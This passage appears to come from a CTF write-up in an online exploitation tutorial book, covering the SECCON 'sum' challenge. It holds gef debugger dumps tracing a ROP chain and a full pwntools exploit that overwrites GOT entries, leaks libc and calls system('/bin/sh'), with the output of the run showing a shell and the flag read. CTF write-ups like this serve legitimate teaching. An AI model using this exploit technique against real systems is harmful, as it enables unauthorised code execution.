+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+Breakpoint 2, 0x00000000004009a7 in main ()
+gef➤  
+</code></pre>
+<p>So now we have a libc infoleak, and a qword write. This is all we need to pwn the code. I initially tried doing a oneshot gadget got overwrite, however none of the conditions were met when it was executed. Then I just did another rop gadget using <code>printf</code> again, to just pop the libc address of <code>/bin/sh</code> (which we know thanks to the libc infoleak) into the <code>rdi</code> register, and then return to system. Let's see the rop chain in action:</p>
+<p>First we hit <code>printf</code> again:</p>
+<pre><code>───────────────────────────────────────────────────────────────────── stack ────
+0x00007ffd12150f20│+0x0000: 0x0000000000400a43  →  &lt;__libc_csu_init+99&gt; pop rdi ← $rsp
+0x00007ffd12150f28│+0x0008: 0x00007fab33599e9a  →  0x0068732f6e69622f (&quot;/bin/sh&quot;?)
+0x00007ffd12150f30│+0x0010: 0x00007fab33435440  →  &lt;system+0&gt; test rdi, rdi
+0x00007ffd12150f38│+0x0018: 0x0000000000000000
+0x00007ffd12150f40│+0x0020: 0x0000000000000000
+0x00007ffd12150f48│+0x0028: 0x00007ffd12150f50  →  0x0000ff5666dcfd1d
+0x00007ffd12150f50│+0x0030: 0x0000ff5666dcfd1d
+0x00007ffd12150f58│+0x0038: 0xc21062d171a89f00
+─────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x4009af &lt;main+172&gt;       lock   mov rsi, rax
+     0x4009b3 &lt;main+176&gt;       lea    rdi, [rip+0x11b]        # 0x400ad5
+     0x4009ba &lt;main+183&gt;       mov    eax, 0x0
+ →   0x4009bf &lt;main+188&gt;       call   0x400620 &lt;printf@plt&gt;
+   ↳    0x400620 &lt;printf@plt+0&gt;   jmp    QWORD PTR [rip+0x200a02]        # 0x601028
+        0x400626 &lt;printf@plt+6&gt;   push   0x2
+        0x40062b &lt;printf@plt+11&gt;  jmp    0x4005f0
+        0x400630 &lt;alarm@plt+0&gt;    jmp    QWORD PTR [rip+0x2009fa]        # 0x601030
+        0x400636 &lt;alarm@plt+6&gt;    push   0x3
+        0x40063b &lt;alarm@plt+11&gt;   jmp    0x4005f0
+─────────────────────────────────────────────────────── arguments (guessed) ────
+printf@plt (
+   $rdi = 0x0000000000400ad5 → 0x0100000a756c6c25 (&quot;%llu&quot;?),
+   $rsi = 0x0000ff5666dcfd1d,
+   $rdx = 0x0000000000000018,
+   $rcx = 0x0000000000000000
+)
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;sum_ccafa40ee6a&quot;, stopped, reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x4009bf → main()
+────────────────────────────────────────────────────────────────────────────────
+
+Breakpoint 1, 0x00000000004009bf in main ()
+gef➤  
+</code></pre>
+<p>Then we have the <code>pop rdi; ret</code> to rid ourselves of the return address:</p>
+<pre><code>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffd12150f18│+0x0000: 0x00000000004009c4  →  &lt;main+193&gt; mov eax, 0x0     ← $rsp
+0x00007ffd12150f20│+0x0008: 0x0000000000400a43  →  &lt;__libc_csu_init+99&gt; pop rdi
+0x00007ffd12150f28│+0x0010: 0x00007fab33599e9a  →  0x0068732f6e69622f (&quot;/bin/sh&quot;?)
+0x00007ffd12150f30│+0x0018: 0x00007fab33435440  →  &lt;system+0&gt; test rdi, rdi
+0x00007ffd12150f38│+0x0020: 0x0000000000000000
+0x00007ffd12150f40│+0x0028: 0x0000000000000000
+0x00007ffd12150f48│+0x0030: 0x00007ffd12150f50  →  0x0000ff5666dcfd1d
+0x00007ffd12150f50│+0x0038: 0x0000ff5666dcfd1d
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+ →   0x400a43 &lt;__libc_csu_init+99&gt; pop    rdi
+     0x400a44 &lt;__libc_csu_init+100&gt; ret    
+     0x400a45                  nop    
+     0x400a46                  nop    WORD PTR cs:[rax+rax*1+0x0]
+     0x400a50 &lt;__libc_csu_fini+0&gt; repz   ret
+     0x400a52                  add    BYTE PTR [rax], al
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;sum_ccafa40ee6a&quot;, stopped, reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400a43 → __libc_csu_init()
+[#1] 0x400a43 → __libc_csu_init()
+[#2] 0x7fab33435440 → test rdi, rdi
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x0000000000400a43 in __libc_csu_init ()
+gef➤  s
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x0               
+$rcx   : 0x0               
+$rdx   : 0x18              
+$rsp   : 0x00007ffd12150f20  →  0x0000000000400a43  →  &lt;__libc_csu_init+99&gt; pop rdi
+$rbp   : 0x00007ffd12150f60  →  0x00007ffd12150f90  →  0x00007ffd12150fe0  →  0x00007ffd12151030  →  0x00000000004009e0  →  &lt;__libc_csu_init+0&gt; push r15
+$rsi   : 0xff5666dcfd1d    
+$rdi   : 0x00000000004009c4  →  &lt;main+193&gt; mov eax, 0x0
+$rip   : 0x0000000000400a44  →  &lt;__libc_csu_init+100&gt; ret
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x00007fab33584cc0  →  0x0002000200020002
+$r11   : 0x0000000000400a6c  →   add BYTE PTR [rax], al
+$r12   : 0x0000000000400670  →  &lt;_start+0&gt; xor ebp, ebp
+$r13   : 0x00007ffd12151110  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero CARRY parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffd12150f20│+0x0000: 0x0000000000400a43  →  &lt;__libc_csu_init+99&gt; pop rdi     ← $rsp
+0x00007ffd12150f28│+0x0008: 0x00007fab33599e9a  →  0x0068732f6e69622f (&quot;/bin/sh&quot;?)
+0x00007ffd12150f30│+0x0010: 0x00007fab33435440  →  &lt;system+0&gt; test rdi, rdi
+0x00007ffd12150f38│+0x0018: 0x0000000000000000
+0x00007ffd12150f40│+0x0020: 0x0000000000000000
+0x00007ffd12150f48│+0x0028: 0x00007ffd12150f50  →  0x0000ff5666dcfd1d
+0x00007ffd12150f50│+0x0030: 0x0000ff5666dcfd1d
+0x00007ffd12150f58│+0x0038: 0xc21062d171a89f00
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x400a3e &lt;__libc_csu_init+94&gt; pop    r13
+     0x400a40 &lt;__libc_csu_init+96&gt; pop    r14
+     0x400a42 &lt;__libc_csu_init+98&gt; pop    r15
+ →   0x400a44 &lt;__libc_csu_init+100&gt; ret    
+   ↳    0x400a43 &lt;__libc_csu_init+99&gt; pop    rdi
+        0x400a44 &lt;__libc_csu_init+100&gt; ret    
+        0x400a45                  nop    
+        0x400a46                  nop    WORD PTR cs:[rax+rax*1+0x0]
+        0x400a50 &lt;__libc_csu_fini+0&gt; repz   ret
+        0x400a52                  add    BYTE PTR [rax], al
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;sum_ccafa40ee6a&quot;, stopped, reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400a44 → __libc_csu_init()
+[#1] 0x400a43 → __libc_csu_init()
+[#2] 0x7fab33435440 → test rdi, rdi
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x0000000000400a44 in __libc_csu_init ()
+gef➤  
+</code></pre>
+<p>Then we have the rop gadget to through the address of <code>/bin/sh</code> into <code>rdi</code>, and return to system:</p>
+<pre><code>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffd12150f28│+0x0000: 0x00007fab33599e9a  →  0x0068732f6e69622f (&quot;/bin/sh&quot;?)     ← $rsp
+0x00007ffd12150f30│+0x0008: 0x00007fab33435440  →  &lt;system+0&gt; test rdi, rdi
+0x00007ffd12150f38│+0x0010: 0x0000000000000000
+0x00007ffd12150f40│+0x0018: 0x0000000000000000
+0x00007ffd12150f48│+0x0020: 0x00007ffd12150f50  →  0x0000ff5666dcfd1d
+0x00007ffd12150f50│+0x0028: 0x0000ff5666dcfd1d
+0x00007ffd12150f58│+0x0030: 0xc21062d171a89f00
+0x00007ffd12150f60│+0x0038: 0x00007ffd12150f90  →  0x00007ffd12150fe0  →  0x00007ffd12151030  →  0x00000000004009e0  →  &lt;__libc_csu_init+0&gt; push r15     ← $rbp
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+ →   0x400a43 &lt;__libc_csu_init+99&gt; pop    rdi
+     0x400a44 &lt;__libc_csu_init+100&gt; ret    
+     0x400a45                  nop    
+     0x400a46                  nop    WORD PTR cs:[rax+rax*1+0x0]
+     0x400a50 &lt;__libc_csu_fini+0&gt; repz   ret
+     0x400a52                  add    BYTE PTR [rax], al
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;sum_ccafa40ee6a&quot;, stopped, reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400a43 → __libc_csu_init()
+[#1] 0x7fab33435440 → test rdi, rdi
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x0000000000400a43 in __libc_csu_init ()
+gef➤  s
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x0               
+$rcx   : 0x0               
+$rdx   : 0x18              
+$rsp   : 0x00007ffd12150f30  →  0x00007fab33435440  →  &lt;system+0&gt; test rdi, rdi
+$rbp   : 0x00007ffd12150f60  →  0x00007ffd12150f90  →  0x00007ffd12150fe0  →  0x00007ffd12151030  →  0x00000000004009e0  →  &lt;__libc_csu_init+0&gt; push r15
+$rsi   : 0xff5666dcfd1d    
+$rdi   : 0x00007fab33599e9a  →  0x0068732f6e69622f (&quot;/bin/sh&quot;?)
+$rip   : 0x0000000000400a44  →  &lt;__libc_csu_init+100&gt; ret
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x00007fab33584cc0  →  0x0002000200020002
+$r11   : 0x0000000000400a6c  →   add BYTE PTR [rax], al
+$r12   : 0x0000000000400670  →  &lt;_start+0&gt; xor ebp, ebp
+$r13   : 0x00007ffd12151110  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero CARRY parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffd12150f30│+0x0000: 0x00007fab33435440  →  &lt;system+0&gt; test rdi, rdi     ← $rsp
+0x00007ffd12150f38│+0x0008: 0x0000000000000000
+0x00007ffd12150f40│+0x0010: 0x0000000000000000
+0x00007ffd12150f48│+0x0018: 0x00007ffd12150f50  →  0x0000ff5666dcfd1d
+0x00007ffd12150f50│+0x0020: 0x0000ff5666dcfd1d
+0x00007ffd12150f58│+0x0028: 0xc21062d171a89f00
+0x00007ffd12150f60│+0x0030: 0x00007ffd12150f90  →  0x00007ffd12150fe0  →  0x00007ffd12151030  →  0x00000000004009e0  →  &lt;__libc_csu_init+0&gt; push r15     ← $rbp
+0x00007ffd12150f68│+0x0038: 0x00000000004009ac  →  &lt;main+169&gt; mov rax, QWORD PTR [rbp-0x10]
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x400a3e &lt;__libc_csu_init+94&gt; pop    r13
+     0x400a40 &lt;__libc_csu_init+96&gt; pop    r14
+     0x400a42 &lt;__libc_csu_init+98&gt; pop    r15
+ →   0x400a44 &lt;__libc_csu_init+100&gt; ret    
+   ↳  0x7fab33435440 &lt;system+0&gt;       test   rdi, rdi
+      0x7fab33435443 &lt;system+3&gt;       je     0x7fab33435450 &lt;system+16&gt;
+      0x7fab33435445 &lt;system+5&gt;       jmp    0x7fab33434eb0
+      0x7fab3343544a &lt;system+10&gt;      nop    WORD PTR [rax+rax*1+0x0]
+      0x7fab33435450 &lt;system+16&gt;      lea    rdi, [rip+0x164a4b]        # 0x7fab33599ea2
+      0x7fab33435457 &lt;system+23&gt;      sub    rsp, 0x8
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;sum_ccafa40ee6a&quot;, stopped, reason: SINGLE STEP
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400a44 → __libc_csu_init()
+[#1] 0x7fab33435440 → test rdi, rdi
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x0000000000400a44 in __libc_csu_init ()
+gef➤  x/s $rdi
+0x7fab33599e9a:    &quot;/bin/sh&quot;
+gef➤  
+</code></pre>
+<h2><a class="header" href="#exploit" id="exploit">Exploit</a></h2>
+<p>Putting it all together, we have the following exploit:</p>
+<pre><code>from pwn import *
+
+# Establish the target
+#target = remote(&quot;sum.chal.seccon.jp&quot;, 10001)
+target = process('sum_ccafa40ee6a5a675341787636292bf3c84d17264', env={&quot;LD_PRELOAD&quot;:&quot;./libc.so&quot;})
+#gdb.attach(target, gdbscript='b *0x4009bf\nb *0x4009a7')
+
+# Establish the libc / binary files
+elf = ELF('sum_ccafa40ee6a5a675341787636292bf3c84d17264')
+libc = ELF(&quot;libc.so&quot;)
+
+# Establish some needed addresses
+main = elf.symbols['main']
+
+popRdi = 0x400a43
+
+
+# A function to handle the qword writes
+def write(adr, value):
+    target.sendline(&quot;9223372036854775807&quot;)
+    target.sendline(str(0x7fffffffffffffff - adr))
+    target.sendline(&quot;1&quot;)
+    target.sendline(&quot;1&quot;)
+    target.sendline(str(value))
+
+    target.sendline(str(adr))
+
+# Overwrite got address of exit with the starting address of main
+write(elf.got['exit'], main)
+
+# Overwrite got address of printf with popRdi gadget
+write(elf.got['printf'], popRdi)
+
+# Rop chain to leak libc via puts(got_puts)
+target.sendline(str(popRdi))                # pop rdi to make puts call
+target.sendline(str(elf.got['puts']))       # got address of puts, argument to puts call
+target.sendline(str(elf.symbols['puts']))   # plt address of puts
+target.sendline(str(0x4009a7))              # address of `call exit`, to bring us back to start of main
+target.sendline(&quot;0&quot;)                        # 0 to end number sequence
+
+
+# Scan in output of program, to make it to the infoleak
+for i in range(0, 18):
+    print target.recvline()
+
+# Scan in and parse out infoleak, figure out where libc base is
+leak = target.recvline().strip(&quot;\n&quot;)
+leak = u64(leak + &quot;\x00&quot;*(8 - len(leak)))
+base = leak - libc.symbols[&quot;puts&quot;]
+
+print &quot;base is: &quot; + hex(base)
+
+# Rop chain to call system(&quot;/bin/sh&quot;)
+target.sendline(str(popRdi))                        # pop rdi to make system call
+target.sendline(str(base + 0x1b3e9a))               # binsh libc address
+target.sendline(str(base + libc.symbols[&quot;system&quot;])) # libc address of system, which we will return to
+target.sendline(&quot;0&quot;)                                # 0 to end sequence
+
+
+target.interactive()
+</code></pre>
+<p>When we run it:</p>
+<pre><code>$    python exploit.py
+[+] Opening connection to sum.chal.seccon.jp on port 10001: Done
+[*] '/home/guyinatuxedo/Desktop/seccon/sum/sum_ccafa40ee6a5a675341787636292bf3c84d17264'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/home/guyinatuxedo/Desktop/seccon/sum/libc.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[sum system]
+
+Input numbers except for 0.
+
+0 is interpreted as the end of sequence.
+
+
+
+[Example]
+
+2 3 4 0
+
+[sum system]
+
+Input numbers except for 0.
+
+0 is interpreted as the end of sequence.
+
+
+
+[Example]
+
+2 3 4 0
+
+[sum system]
+
+Input numbers except for 0.
+
+0 is interpreted as the end of sequence.
+
+
+
+[Example]
+
+2 3 4 0
+
+base is: 0x7f796623c000
+[*] Switching to interactive mode
+[sum system]
+Input numbers except for 0.
+0 is interpreted as the end of sequence.
+
+[Example]
+2 3 4 0
+$ w
+ 20:42:25 up 18:10,  0 users,  load average: 0.02, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+$ ls
+bin
+boot
+dev
+etc
+flag.txt
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+start.sh
+sum
+sys
+tmp
+usr
+var
+$ cat flag.txt
+SECCON{ret_call_call_ret??_ret_ret_ret........shell!}
+$  
+</code></pre>
+<p>Just like that, we pwned the challenge!</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        
+                            <a rel="prev" href="../../17-stack_pivot/insomnihack18_onewrite/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                        
+
+                        
+                            <a rel="next" href="../../17-stack_pivot/xctf16_b0verflow/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                
+                    <a rel="prev" href="../../17-stack_pivot/insomnihack18_onewrite/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+                    <a rel="next" href="../../17-stack_pivot/xctf16_b0verflow/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+                
+            </nav>
+
+        </div>
+
+        
+
+        
+
+        
+
+        
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        
+
+        
+
+        
+        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        
+
+        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        
+
+        
+
+    </body>
+</html>
